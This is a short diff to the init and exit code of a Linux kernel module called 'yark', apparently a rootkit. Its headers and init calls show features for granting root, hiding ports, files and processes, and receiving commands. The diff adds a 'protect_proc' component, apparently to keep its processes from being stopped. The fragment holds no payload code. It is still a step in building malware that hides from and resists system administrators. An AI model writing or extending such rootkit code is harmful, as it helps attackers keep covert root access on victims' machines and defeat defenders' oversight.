@@ -8,6 +8,7 @@
 #include "yhook.h"
 #include "give_root.h"
 #include "hide_proc.h"
+#include "protect_proc.h"
 
 static int __init yark_init(void) {
     pr_info(LOG_PREFIX "call yark_init()\n");
@@ -15,6 +16,7 @@ static int __init yark_init(void) {
     hide_port_init();
     hide_file_init();
     hide_proc_init();
+    protect_proc_init();
     command_start();
 
     return 0;
@@ -26,6 +28,7 @@ static void __exit yark_exit(void) {
     hide_file_exit();
     hide_port_exit();
     hide_proc_exit();
+    protect_proc_exit();
 }
 
 module_init(yark_init);
